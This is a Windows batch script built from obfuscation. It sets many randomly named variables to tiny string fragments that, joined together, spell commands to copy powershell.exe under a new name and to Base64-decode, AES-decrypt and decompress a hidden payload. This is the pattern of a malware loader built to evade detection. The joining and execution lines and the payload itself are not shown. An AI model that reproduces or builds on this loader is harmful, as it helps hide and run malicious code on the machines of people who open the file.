@echo off
set "EGkJAaxyJl=ll"
set "pyeFabVGxj=ll"
set "POcjlxXVZL=1."
set "lBIIGVbrDY=y "
set "LAhkEQEbxd=we"
set "CcQcZfHUvY=0\"
set "eFZAKZqGIm=do"
set "GaGITmQINQ=xe"
set "xsLZbzliIN=em"
set "WtKnJmGmuO=co"
set "TCLzgHbaiV=32"
set "CZTplJVfvg=:\"
set "dnklcIgTaG=nd"
set "MpqdDfFEGu=he"
set "cCyXIhigSh=rs"
set "eDbcCpOEiB=s\"
set "MoYDRhGwwE=we"
set "ZYSaNExTWH= /"
set "ovcAtRvEwY=ws"
set "LSEVYxAGHl=rS"
set "TDhbdhUMbF=in"
set "abXwbOhyQu=po"
set "kYiRmjueww=\v"
set "AFMdepOHnD=Sy"
set "CbfPUpwlwh=st"
set "bYavTpvKvY=Po"
set "BhAUOZJxiG=py"
set "dzzIJLCuff=Wi"
set "mNdnlCokJf=ow"
set "NGXgDcymin=\W"
set "OnmRncZSih= C"
set "BGxrVxCaNT=.e"
set "BzJywOQGix=he"
set "jdcbxkngFZ=cd"
set "AUKJuqAYQG= %~dp0"
set "wpZbnLyGqN=e = "
set "daNZLiGYHF=.Key"
set "cvELvgdyao=106u"
set "bdpNmGpPoy=oL'["
set "SHvMeBaPgU='gni"
set "HIwCqLTDnW=;$fp"
set "qdgbProssZ=Obje"
set "VDiDnTgwDQ= [Sy"
set "naHGjVZkUT=File"
set "KQMrxscJxR=em.C"
set "MIsAGZaans= if "
set "nsvcaRhhBV=);$z"
set "uXuvKswYIV=[Sys"
set "TwSvtdSDcH=n ''"
set "BSZyHdDtZK=.Mod"
set "hzeOeEhUam=.Cop"
set "AXPyQsuQVZ='[-1"
set "mPBdRdngKy=$zhJ"
set "HFJglxFIaB=.Com"
set "XHfEHXwayQ='[-1"
set "MIestvmJFd=n ''"
set "SqBqbBSxKs=ptog"
set "MWlXrEwTev=.Cry"
set "GMHxGyfTHY=S46e"
set "UqDHiszCdQ='txe"
set "kpghicWWPA== [S"
set "IucAKDSseP=ing("
set "JVKxIUvOVs=oU.T"
set "cAQGhgobFt=ose("
set "rpSKWZperI=ecry"
set "MslHSQygiw=::('"
